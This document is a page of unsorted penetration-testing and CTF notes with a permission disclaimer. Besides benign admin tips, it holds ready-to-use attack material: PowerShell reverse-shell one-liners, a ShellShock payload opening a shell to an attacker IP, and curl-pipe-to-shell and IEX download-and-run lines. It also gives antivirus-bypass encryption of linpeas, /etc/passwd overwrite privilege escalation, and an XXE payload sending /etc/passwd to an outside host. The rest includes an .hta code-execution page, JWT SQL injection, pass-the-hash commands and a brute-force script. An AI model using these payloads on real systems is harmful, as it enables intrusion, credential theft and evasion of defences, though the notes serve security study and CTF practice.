---
description: >-
  Misc notes that still need to be sorted through and sent to their proper
  homes.
---

# Unsorted

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

## Markdown

```text
{% hint style="warning" %} Text between these will show up in a Warning box. Looks nice! {% endhint %}
```

{% hint style="danger" %}
Text between these will show up in a Warning box. Looks nice!

_Can click on the icon to change it to something appropriate \( Changes style, I think. Gitbook only?\)._
{% endhint %}

## -----

[https://8gwifi.org/PemParserFunctions.jsp](https://8gwifi.org/PemParserFunctions.jsp) &lt;--extract information from various digital certificates

## -----

locate all files that symlink to this\_file: `find -L / -samefile path/to/<this_file>`

## -----

## SSH Keys

``` extract public key from private key:``openssl rsa -in privkey.pem -pubout -out key.pub\`

## -----

Powershell wget [http://blog.stackexchange.com/](http://blog.stackexchange.com/) -OutFile out.html wget is an alias for Invoke-WebRequest

## -----

Windows enumeration: whoami /all net use z:  tasklist /v \(verbose\) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"\]

## -----

./winpeas.exe cmd

## -----

aquatone ?? - pulls up series of websites and takes screenshots

## -----

shortcut for all ports: `nmap -p-`

## -----

Firefox Browser plugins:Tampermonkey \(userscript manager\); Cookie Manager+;

## HEX

view hex of file only: `xxd -p`

reverse from hex: `xxd -r -p > <filename>`

## msfvenom

custom exploit making:\[Ippsec:HacktheBox - Granny & Grandpa\]

```bash
msfvenom -p <payload> LHOST=<lhost> etc... -f <filetype [use --help-formats first]>
```

## -----

injecting IPs when '.' is disallowed: convert dotted\_decimal to decimal value -[ip2dh](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)

## -----

[AndroidAssetStudio](https://romannurik.github.io/AndroidAssetStudio/index.html)

## Port knocking

[Ippsec:HackTheBox - Nineveh](https://www.youtube.com/watch?v=K9DKULxSBK4)

iptables knockd:

```bash
for i in <port> <port> <port>; do nmap -Pn -p $i --host_timeout 201 --max_retries 0 <ip>; done
```

## -----

recursively download all files in hosted folder: `wget -r <ip:port>`

## -----

[Hurricane Electric ISP](http://he.net/): Ippsec uses with IPv6 as a psuedo-VPN in [HTB:Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

## IPv6

primer: [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

```text
fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA 
(built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)

fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x 

2000::/3 - Global Unicast routable 

ff02::1 - Multicast All Nodes 

ff02::2 Multicast ROUTER nodes
```

ip6tables - iptables for ipv6

## 

## -----

`ls /usr/share/nmap/scripts/ |grep smb` - find nmap scripts related to smb, search this folder for any scripts for a service you want to enumerate

## -----

Cisco Smart Install Client Service Available -Then, we can pull the configs with SIET: `siet.py -i 10.10.10.10 -g` SIET: [https://github.com/Sab0tag3d/SIET/](https://github.com/Sab0tag3d/SIET/)

## Active Directory

use LDAPDomainDump to gather the AD schema details.[LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump%20)

ADExplorer: [https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)

## pass the hash

responder.py - or - write .lnk files to writeable shares that point back to attacker - capture hashes and relay attacks enable smb signing and limit llmnr \(group policy\) respounder - detect responder - responder guard

`crackmapexec smb ip -u <name> -H <hash> --lsa` - pass the hash; drsuapi - search in wireshark to detect - win long id 4624 user\_reported\_sid: S-1-0-0 logon\_process\_name:ntlmssp

Defense:[https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win\_pass\_the\_hash.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_pass_the_hash.yml); In our lab environment, we could consistently catch the pass-the-hash attacks by monitoring event\_id : 4624, with logon types of ntlmssp, and the security SID at S-1-0-0 \(NULL / NOBODY\). You too can instrument this attack!

## -----

SIGMA - SIGMAC - generic event log formats for siems

## -----

Plumhound -

## -----

Bad blood - create domain for your \(defense tool, or lab setup\) fills AD with objects, don't use in production! \(cant create sessions\)

## `linpeas.sh`

Quick Start

#### From github

`curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`

#### Local network

`sudo python -m SimpleHTTPServer 80` `curl 10.10.10.10/linpeas.sh | sh`

#### Without curl

`sudo nc -q 5 -lvnp 80 < linpeas.sh` `cat < /dev/tcp/10.10.10.10/80 | sh`

#### Output to file

`linpeas -a > /dev/shm/linpeas.txt` -a to execute all the checks.

`less -r /dev/shm/linpeas.txt #Read with colors`

#### AV bypass

#### open-ssl encryption

`openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc` `sudo python -m SimpleHTTPServer 80` \#Start HTTP server `curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh` \# Download from the victim

#### Base64 encoded

```text
#Start HTTP server 
base64 -w0 linpeas.sh > lp.enc sudo python -m SimpleHTTPServer 80 
#Download from the victim Use the parameter 
curl 10.10.10.10/lp.enc | base64 -d | sh
```

### Winpeas

#### Windows icacls file permissions

[https://ss64.com/nt/icacls.html](https://ss64.com/nt/icacls.html) Interesting permissions

D - Delete access F - Full access \(Edit\_Permissions+Create+Delete+Read+Write\) N - No access M - Modify access \(Create+Delete+Read+Write\) RX - Read and eXecute access R - Read-only access W - Write-only access

winpeas.exe cmd searchall searchfast \#cmd commands, search all filenames and avoid sleeping \(noisy - CTFs\)

winpeas.exe \#Will execute all checks except the ones that use a CMD

winpeas.exe cmd \#All checks

winpeas.exe systeminfo userinfo \#Only systeminfo and userinfo checks executed

winpeas.exe notcolor \#Do not color the output

winpeas.exe cmd wait \#cmd commands and wait between tests

In Linux the ouput will be colored using ANSI colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors \(and open a new CMD\): `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

### -----

[https://github.com/wpscanteam/wpscan/issues/190\#issuecomment-18087644](https://github.com/wpscanteam/wpscan/issues/190#issuecomment-18087644) `iconv -f ISO-8859-1 -t UTF-8 /pentest/passwords/wordlists/rockyou.txt > rockyou_utf8.txt`

### -----

[https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/](https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/) [https://activedirectorypro.com/powershell-commands/](https://activedirectorypro.com/powershell-commands/) add commands from these pages

### -----

[https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### -----

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

### -----

[https://vulndev.io/notes/2019/01/01/windows.html](https://vulndev.io/notes/2019/01/01/windows.html)

### -----

#### 

### -----

compress files using windows, sets "Compressed" attribute \(cmd.exe\) `compact /C /S c:\MyDirectory`

### -----

[http://w3af.org/](http://w3af.org/) web application scanner

### -----

[https://base64.guru/converter/decode/file](https://base64.guru/converter/decode/file) recover files sent in base64 \(very useful for recovering files sent in emails\)

### -----

[https://osintframework.com/](https://osintframework.com/)

### -----

### -----

## `command-not-found` errors

[https://stackoverflow.com/questions/19873430/command-not-found-message-when-i-try-to-add-command-in-bashrc/26976325](https://stackoverflow.com/questions/19873430/command-not-found-message-when-i-try-to-add-command-in-bashrc/26976325)

`sudo apt purge command-not-found` and install again, `sudo apt install command-not-found` then `sudo update-command-not-found` to rebuild the database

`sudo chmod ugo+r /var/lib/command-not-found/commands.db*` to fix the permissions on the database \(fixed it! Hopeuflly permanent this time\) [https://bugs.launchpad.net/command-not-found/+bug/1824000](https://bugs.launchpad.net/command-not-found/+bug/1824000)

### -----

wfuzz -c -z range,1-65535 --hl=2 [http://10.10.10.55:60000/url.php?path=localhost:FUZZ](http://10.10.10.55:60000/url.php?path=localhost:FUZZ)

burp intruder alternative for brute-forcing ports \(or any number range\)

### -----

## password file merge, sort, unique:

```text
find . -maxdepth 1 -type f ! -name ".*" -exec cat {} + | sort -u -o /path/to/sorted.txt
```

[https://unix.stackexchange.com/questions/365114/efficiently-merge-sort-unique-large-number-of-text-files](https://unix.stackexchange.com/questions/365114/efficiently-merge-sort-unique-large-number-of-text-files)

### -----

## Faster filtering with the silver searcher

[https://github.com/ggreer/the\_silver\_searcher](https://github.com/ggreer/the_silver_searcher)

For faster searching, use all the above grep regular expressions with the command `ag`.

### -----

take the name of each file in a directory and try to connect to a site with that filename. \(searching for web shells in Traceback- HTB\)

```text
for file in $(cat /home/zweilos/htb/traceback/webshells); do echo $file && curl -I http://10.10.10.181/$file; done
```

### -----

## Misc Notes

### Useful x86 Msfvenom Encoders

```text
x86/shikata_ga_nai
x86/fnstenv_mov
```

### TMUX Hijacking

```text
tmux -S *session path* 
Example: tmux -S /.devs/dev_sess
```

### Hidden Windows Text Stream

Find:

```text
dir /R
```

Read:

```text
more < hm.txt:root.txt:$DATA
```

### DirtyCOW Exploit \(Linux Kernel version from 2.6.22 to 3.9\)

[https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)

### Oracle Enumeration TNS Listener \(port 1521\)

[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)

```text
Also check HackTheBox Silo writeup for more references
```

### Buffer Overflow Bad Chars

```text
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

### JS Meterpreter Payload

```text
msfvenom -p <payload > LHOST=<ip> LPORT=<port> -f js_le -e generic/none
```

### Compile on Linux for Windows x86

```text
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

### From MSSQL Injection to RCE

[https://www.tarlogic.com/en/blog/red-team-tales-0x01/](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)

### Windows Kernel Vulnerabilities Finder - Sherlock \(PowerShell\)

```text
https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

### PowerShell one-liners \(incl. file transfers\)

```text
https://www.puckiestyle.nl/
```

### Much Better PowerShell Reverse Shell One-Liner

```text
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='IP';$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

### Post-Exploitation Enumerate all users of Domain

```text
net user /Domain
```

### Windows XP SP0/SP1 Privilege Escalation:

```text
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
```

### SUID Flag on /usr/bin/cp command Privilege Escalation

```text
1. echo "bob:\$1\$-itnite\$VRvGqpGVibx/r9NPdLLTF1:0:0:root:/root:/bin/bash" >> /tmp/passwd
2. /usr/bin/cp /tmp/passwd /etc/passwd
3. su - bob (Password: bob)
```

### Writable /etc/passwd Privilege Escalation

```text
echo root::0:0:root:/root:/bin/bash > /etc/passwd

su
```

### Bypass robots.txt "You are not a search engine. Permission denied."

```text
Set User-Agent to "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
```

### ShellShock PHP &lt; 5.6.2

```text
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTOM/cgi-bin/admin.cgi
```

### Privilege Escalation through SeImpersonatePrivilege permission \(JuicyPotato\)

[https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) [https://www.absolomb.com/2018-05-04-HackTheBox-Tally/](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)

### Memcached Pentest & Enumeration

[https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)

### Tunneling Post-Exploitation \(PortForwarding\) through Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

### Tunelling on Windows

```text
Using plink.exe within PuTTY project folder
```

### Windows Architecture and Version

```text
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Windows Service Start Mode

```text
wmic service where caption="SERVICE" get startmode
```

### Windows check permissions over a file/executable with 'icacls'

```text
icacls "C\full_path\file.exe"
```

Permissions: F - full access M - modify access RX - read & execute access R - read access W - write-only access

### Powershell Running Services

```text
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

### Client-Side .hta \(HTML-based Internet Explorer only\) Code Execution

```markup
<html>
    <body>
        <script>
            var c= 'cmd.exe'
            new ActiveXObject('WScript.Shell').Run(c);
        </script>
    </body>
</html>
```

### Fingerprinting Client-Side Victim

[https://github.com/fingerprintjs/fingerprintjs2](https://github.com/fingerprintjs/fingerprintjs2)

### Scan Security Headers

[https://securityheaders.com/](https://securityheaders.com/)

### PowerShell to retrieve Active Directory objects \(including deleted\)

### Decode LDAP Passwords

[https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz)

### mysql command line alternative

```bash
mysqldump
```

### TTY Shell that works almost every time on Linux

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Kerberos check for valid usernames or bruteforce user/pass with kerbrute

```bash
kerbrute
```

[https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)

### 

### TeamViewer Privilege Escalation -&gt; CVE-2019-189888

```text
meterpreter &gt; run post/windows/gather/credentials/teamviewer\_passwords
```

### PowerShell Reverse Shell

```text
$client = New-Object System.Net.Sockets.TCPClient\('192.168.0.0',4444\);$stream = $client.GetStream\(\);\[byte\[\]\]$bytes = 0..65535\|%{0};while\(\($i = $stream.Read\($bytes, 0, $bytes.Length\)\) -ne 0\){;$data = \(New-Object -TypeName System.Text.ASCIIEncoding\).GetString\($bytes,0, $i\);$sendback = \(iex $data 2&gt;&1 \| Out-String \);$sendback2 = $sendback + 'PS ' + \(pwd\).Path + '&gt; ';$sendbyte = \(\[text.encoding\]::ASCII\).GetBytes\($sendback2\);$stream.Write\($sendbyte,0,$sendbyte.Length\);$stream.Flush\(\)};$client.Close\(\)

$sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[byte\[\]\]$bt=0..65535\|%{0};while\(\($i=$sm.Read\($bt,0,$bt.Length\)\) -ne 0\){;$d=\(New-Object Text.ASCIIEncoding\).GetString\($bt,0,$i\);$st=\(\[text.encoding\]::ASCII\).GetBytes\(\(iex $d 2&gt;&1\)\);$sm.Write\($st,0,$st.Length\)}
```

Pull the shell:

```text
powershell.exe -c "IEX \(New-Object Net.WebClient\).DownloadString\('SHELL URL'\)"
```

### Wget Alternative for Windows in PowerShell

```text
$client = new-object System.Net.WebClient $client.DownloadFile\("URL","Local Download Path"\)
```

### CVE-2019-10-15 Sudo &lt; 1.2.28 Privilege Escalation

```text
sudo -u#-1 /bin/bash
```

### Adminer Database Management Tool Exploit Bypass Login

[https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

### Alternate data streams of empty or incomplete file on SMB

`allinfo *file*`

### SMB Recursively List Files

`recurse on`   
 `ls`

### Telnet &gt; Netcat

When connecting to a service, where possible, choose TELNET over Netcat

### /etc/update-motd.d Privilege Escalation

[https://blog.haao.sh/writeups/fowsniff-writeup/](https://blog.haao.sh/writeups/fowsniff-writeup/)

### SSH into Victim without password

1. From the attacker machine generate RSA keypair: `ssh-keygen -t rsa`
2. Copy the public key \(id\_rsa.pub\) into the `.ssh/authorized_keys` file of the victim
3. SSH with the -i argument \(id\_rsa\)

### Really Good Privilege Escalation Scripts

[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

### XMPP Authentication Crack

```python
import base64
import hashlib
import hmac
import itertools

charset = "_abcdefghijklmnopqrstuvwxyz"

initial_message = "n=,r="
server_first_message = "r=,s=,i="
server_final_message_compare = "v="
r = server_first_message[2:server_first_message.find('s=')-1]
s = server_first_message[server_first_message.find('s=')+2:server_first_message.find('i=')-1]
i = server_first_message[server_first_message.find('i=')+2:]

for passlen in range(1,3):
    print "test passlen %d" % passlen
    for k in itertools.permutations(charset, passlen):
        password = "koma" + "".join(k)
        salt = base64.b64decode(s)
        client_final_message_bare = 'c=biws,r=' + r
        salt_password = hashlib.pbkdf2_hmac('sha1', password, salt, int(i))
        auth_message = initial_message + ',' + server_first_message + ',' + client_final_message_bare
        server_key = hmac.new(salt_password, 'Server Key', hashlib.sha1).digest()
        server_signature = hmac.new(server_key, auth_message, hashlib.sha1).digest()
        server_final_message = 'v=' + base64.b64encode(server_signature)
        if server_final_message == server_final_message_compare:
            print "found the result"
            print password
            h = hashlib.new('sha1')
            h.update(password)
            print h.hexdigest()
            exit(-1)
```

### CTF Docs

[https://github.com/welchbj/ctf/tree/master/docs](https://github.com/welchbj/ctf/tree/master/docs)

### Test for LDAP NULL BIND

```bash
ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
```

### Extract VBA Script from document

[https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php)

### Decode Rubber Ducky USB .bin payloads

[https://ducktoolkit.com/decode\#](https://ducktoolkit.com/decode#)

### Crack Android lockscreen from system files \(gesture.key\)

[https://github.com/KieronCraggs/GestureCrack](https://github.com/KieronCraggs/GestureCrack)

### XOR Analysis

[https://github.com/hellman/xortool](https://github.com/hellman/xortool)

### Cryptanalysis

[https://github.com/nccgroup/featherduster](https://github.com/nccgroup/featherduster)

### RSA Cracking Tools

* [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
* [https://github.com/ius/rsatool](https://github.com/ius/rsatool)

### Morse Code Audio Decode

[https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

### Text to 21 Common Ciphers

[https://v2.cryptii.com/text/select](https://v2.cryptii.com/text/select)

### Crypto Example Challenges

[https://asecuritysite.com/encryption/ctf?mybutton=](https://asecuritysite.com/encryption/ctf?mybutton=)

### Shift in Python \(crypto\)

```python
with open('FILENAME') as f:
    msg = f.read()
    for x in range(256):
        print ''.join([chr((ord(y) + x) % 256) for y in msg])
```

### Predict encoding/crypto type

[https://gchq.github.io/CyberChef/\#recipe=Magic\(3,false,false](https://gchq.github.io/CyberChef/#recipe=Magic%283,false,false),''\)

### Get data, process and respond over a socket

```python
import socket
import re

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('IP', PORT))
data = clientsocket.recv(1024)
print data
result = re.sub('[^0-9]', '', data) #Retrieve the digits (or numbers) only from input
print result
clientsocket.send(str(result))
data = clientsocket.recv(1024)
print data
```

### Extract domain names & hosts from PCAP

_Domain Names_

```bash
tshark -r *PCAP* -Y 'dns' -T fields -e dns.qry.name | sort -u > dns.txt
```

_Hosts_

```bash
tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
```

### XPATH Dump

```text
https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
```

### LFI Retrieve File without executing it

```text
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

### Useful PCAP Reader

```bash
chaosreader
```

### ZIP Format File Signatures

_HEADER_

```text
50 4B 03 04 14
```

_FOOTER_

```text
50 4B 05 06 00
```

### JWT KID Value Exploitation

_Sign with public file from server_

```text
kid: public/css/file.css

wget file.css from target

manipulate token using jwt_tool and sign it with file.css
```

_SQL Injection_

```text
kid: test' UNION SELECT 'key';--

manipulate token using jwt_tool and sign it using the secret -> 'key'
```

### Blind XXE to SSRF

_ON TARGET_

```markup
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
<foo>&e1;</foo>
`
```

_INSIDE DTD FILE_

```markup
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
%p2;
```

### 



